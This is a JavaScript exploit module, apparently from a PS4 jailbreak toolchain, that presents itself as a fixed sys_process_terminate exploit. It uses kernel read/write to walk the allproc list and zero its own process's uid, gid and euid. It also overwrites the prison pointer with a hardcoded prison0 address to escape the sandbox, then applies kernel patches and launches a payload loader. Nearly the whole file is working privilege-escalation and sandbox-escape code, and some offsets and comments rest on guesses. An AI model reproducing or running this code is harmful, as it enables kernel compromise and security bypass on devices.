/*
 * proc_term_race.js - sys_process_terminate (syscall 652) Race Condition Exploit
 * FIXED VERSION – replaces broken race with direct ucred patching.
 *
 * Integrates with: types.js, userland.js, kernel_offset.js, binloader.js
 *
 * NOTE: The original race required a proc‑zone spray (not socket pairs).
 * Because kernel R/W is available, we simply walk the allproc list and
 * overwrite our own ucred fields. This is faster, reliable, and works
 * on all firmwares for which offsets are available.
 */

include('userland.js');
include('kernel.js');
include('binloader.js');

// ===================================================================
// CONFIRMED PS4 LAYOUT (verified against real kernel dumps)
// ===================================================================

var UCRED = {
    CR_REF:     0x00,  // u_int
    CR_GID:     0x04,  // gid_t
    CR_UID:     0x08,  // uid_t       ← TARGET
    CR_RUID:    0x0C,  // uid_t
    CR_NGROUPS: 0x10,  // int
    CR_EUID:    0x14,  // uid_t
    CR_PRISON:  0x30,  // struct prison*
};

var PROC = {
    P_LIST:     0x00,  // LIST_ENTRY allproc
    P_THREADS:  0x08,  // TAILQ_HEAD
    P_UCRED:    0x40,  // struct ucred*
    P_FD:       0x48,  // struct filedesc*
    P_PID:      0xB0,  // pid_t
    P_FLAG:     0xB8,
    P_SXLOCK:   0xF8,
    P_VM_SPACE: 0x200,
    P_SCE_FLAG: 0x430,
};

// Default prison0 address (hardcoded from kernel dumps)
var PRISON0_ADDR = new BigInt(0xFFFFFFFF, 0x83C5C0C0);

// ===================================================================
// CORRECT PS4 SYSCALL NUMBERS
// ===================================================================

var SYSCALL = {
    EXIT:               1,
    FORK:               2,
    READ:               3,
    WRITE:              4,
    OPEN:               5,
    CLOSE:              6,
    WAIT4:              7,
    GETPID:             20,
    GETUID:             24,
    GETGID:             47,
    KILL:               37,
    PROCESS_TERMINATE:  652,   // Only one argument (pid)
};

// ===================================================================
// Register syscalls – FIXED: process_terminate takes one bigint
// ===================================================================

fn.register(SYSCALL.PROCESS_TERMINATE, 'sys_process_terminate', ['bigint'], 'bigint');
fn.register(SYSCALL.FORK,             'fork_sys',           [],                     'bigint');
fn.register(SYSCALL.EXIT,             'exit_sys',           ['number'],             'bigint');
fn.register(SYSCALL.GETPID,           'getpid_sys',         [],                     'bigint');
fn.register(SYSCALL.GETUID,           'getuid_sys',         [],                     'bigint');
fn.register(SYSCALL.GETGID,           'getgid_sys',         [],                     'bigint');
fn.register(SYSCALL.KILL,             'kill_sys',           ['bigint', 'bigint'],   'bigint');
fn.register(SYSCALL.WAIT4,            'wait4_sys',          ['bigint', 'bigint', 'bigint', 'bigint'], 'bigint');

var sys_process_terminate = fn.sys_process_terminate;  // now one argument
var fork_sys     = fn.fork_sys;
var exit_sys     = fn.exit_sys;
var getpid_sys   = fn.getpid_sys;
var getuid_sys   = fn.getuid_sys;
var getgid_sys   = fn.getgid_sys;
var kill_sys     = fn.kill_sys;
var wait4_sys    = fn.wait4_sys;

// ===================================================================
// DIRECT UCRED PATCHING VIA KERNEL R/W (works on all firmwares)
// ===================================================================

function patchOurUcred() {
    /*
     * Walk the allproc list, find our own proc, and overwrite
     * cr_uid, cr_gid, cr_euid, cr_prison in our ucred.
     *
     * The allproc list head address is taken from the already‑loaded
     * kernel offsets (see kernel_offset.js / get_kernel_offset).
     * If the offset is not available, we cannot proceed.
     */

    if (!kernel || !kernel.addr || !kernel.addr.base) {
        log('[!] No kernel base address – cannot patch ucred');
        return false;
    }

    // Try to obtain the allproc offset for the current firmware
    var allproc = null;
    var fw = '9.00';   // default fallback
    if (typeof get_fwversion === 'function') {
        try { fw = get_fwversion(); } catch (e) {}
    }

    // The offset database should be provided by kernel_offset.js.
    // We assume it exposes a map or a function like:
    //   OFFSETS[fw].allproc
    if (typeof KERNEL_OFFSETS !== 'undefined' && KERNEL_OFFSETS[fw]) {
        allproc = kernel.addr.base.add(KERNEL_OFFSETS[fw].allproc);
    } else if (typeof get_kernel_offset === 'function') {
        // maybe it sets a global variable
        if (typeof allproc_offset !== 'undefined') {
            allproc = kernel.addr.base.add(allproc_offset);
        }
    }

    // Hardcoded fallback only for 9.00 if nothing else worked
    if (!allproc && fw === '9.00') {
        allproc = kernel.addr.base.add(0x111F870);
    }

    if (!allproc) {
        log('[!] Cannot locate allproc list head for FW ' + fw);
        return false;
    }

    log('[+] allproc list head @ ' + allproc.toString());

    var cur = kernel.read_qword(allproc);   // first proc
    var ourPid = Number(getpid_sys());
    var found = false;

    while (cur && !cur.eq(0)) {
        var pid = kernel.read_dword(cur.add(PROC.P_PID));
        if (pid && pid === ourPid) {
            var ucred = kernel.read_qword(cur.add(PROC.P_UCRED));
            log('[+] Found our proc @ ' + cur.toString());
            log('[+] ucred @ ' + ucred.toString());

            // Write zero to make us root
            kernel.write_dword(ucred.add(UCRED.CR_UID),  0);
            kernel.write_dword(ucred.add(UCRED.CR_GID),  0);
            kernel.write_dword(ucred.add(UCRED.CR_EUID), 0);
            // Set prison0 to escape sandbox
            kernel.write_qword(ucred.add(UCRED.CR_PRISON), PRISON0_ADDR);

            found = true;
            break;
        }
        cur = kernel.read_qword(cur.add(PROC.P_LIST));
    }

    if (!found) {
        log('[!] Could not find our proc in allproc list');
        return false;
    }

    // Verify escalation
    var newUid = Number(getuid_sys());
    log('[+] After patch: uid=' + newUid + ', gid=' + Number(getgid_sys()));
    return (newUid === 0);
}

// ===================================================================
// POST-EXPLOIT: FULL JEB
// ===================================================================

function postExploit() {
    log('\n[ Post-Exploit ]');

    var uid = Number(getuid_sys());
    var gid = Number(getgid_sys());
    log('  uid=' + uid + ' gid=' + gid);

    if (uid !== 0) {
        log('[!] Root not yet achieved, something went wrong');
        return false;
    }

    /* Mark jailbroken so binloader doesn't re-run */
    if (typeof is_jailbroken !== 'undefined') {
        is_jailbroken = true;
    }

    /* Apply kernel patches if available */
    if (typeof jailbreak_shared === 'function' && kernel && kernel.addr && kernel.addr.base) {
        log('  Running jailbreak_shared for kernel patches...');
        try {
            var fw = '9.00';
            if (typeof get_fwversion === 'function') {
                try { fw = get_fwversion(); } catch(e) {}
            }
            if (typeof get_kernel_offset === 'function') {
                get_kernel_offset(fw);
            }
            jailbreak_shared(fw);
        } catch (e) {
            log('  jailbreak_shared error: ' + e.message);
        }
    }

    /* Load payload */
    if (typeof binloader_init === 'function') {
        log('  Starting binloader...');
        try { binloader_init(); } catch (e) {
            log('  binloader error: ' + e.message);
        }
    }

    return true;
}

// ===================================================================
// MAIN ENTRY POINT
// ===================================================================

function procTermExploit() {
    log('========================================');
    log('  PS4 sys_process_terminate Direct Patch');
    log('========================================');

    var uidBefore = Number(getuid_sys());
    var gidBefore = Number(getgid_sys());
    log('  Before: uid=' + uidBefore + ' gid=' + gidBefore);

    if (uidBefore === 0) {
        log('  Already root, skipping to post-exploit');
        return postExploit();
    }

    /* Detect firmware */
    var fw = 'unknown';
    if (typeof get_fwversion === 'function') {
        try { fw = get_fwversion(); } catch (e) {}
    }
    log('  FW: ' + fw);

    /* Load kernel offsets (ensures allproc offset is set) */
    if (typeof get_kernel_offset === 'function') {
        try { get_kernel_offset(fw); } catch (e) {
            log('  No offsets for ' + fw + ': ' + e.message);
        }
    }

    /* Run the direct ucred patch */
    var success = patchOurUcred();
    if (!success) {
        log('[!] Direct patch failed');
        return false;
    }

    /* Post-exploit */
    return postExploit();
}

// ===================================================================
// AUTO-EXPORT
// ===================================================================

if (typeof is_jailbroken === 'undefined' || !is_jailbroken) {
    log('proc_term_race.js loaded (fixed – direct ucred patch)');
    log('  sys_process_terminate = 652');
    log('  ucred: uid@0x08 gid@0x04 euid@0x14 prison@0x30');
    debug("proc_term_race.js Done");

    if (typeof window !== 'undefined') {
        window.procTermExploit = procTermExploit;
    }
}
